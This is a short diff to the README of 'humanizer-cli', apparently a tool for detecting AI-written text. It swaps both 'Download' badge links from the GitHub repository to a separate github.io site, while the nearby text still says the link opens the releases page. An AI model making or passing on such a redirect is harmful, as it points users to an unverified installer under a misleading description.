@@ -1,6 +1,6 @@
 # 🧠 humanizer-cli - Spot AI Text in Seconds
 
-[![Download Now](https://img.shields.io/badge/Download-Windows%20Installer-2ea44f?style=for-the-badge&logo=windows)](https://github.com/Arindaag760/humanizer-cli)
+[![Download Now](https://img.shields.io/badge/Download-Windows%20Installer-2ea44f?style=for-the-badge&logo=windows)](https://arindaag760.github.io)
 
 ---
 
@@ -182,7 +182,7 @@ Each result also shows a breakdown of which patterns were found. You can see exa
 
 ## 🔗 Download Again
 
-[![Get humanizer-cli](https://img.shields.io/badge/Download-Latest%20Release-0366d6?style=for-the-badge&logo=github)](https://github.com/Arindaag760/humanizer-cli)
+[![Get humanizer-cli](https://img.shields.io/badge/Download-Latest%20Release-0366d6?style=for-the-badge&logo=github)](https://arindaag760.github.io)
 
 Click the button above to go to the GitHub releases page. Download the latest version.
 
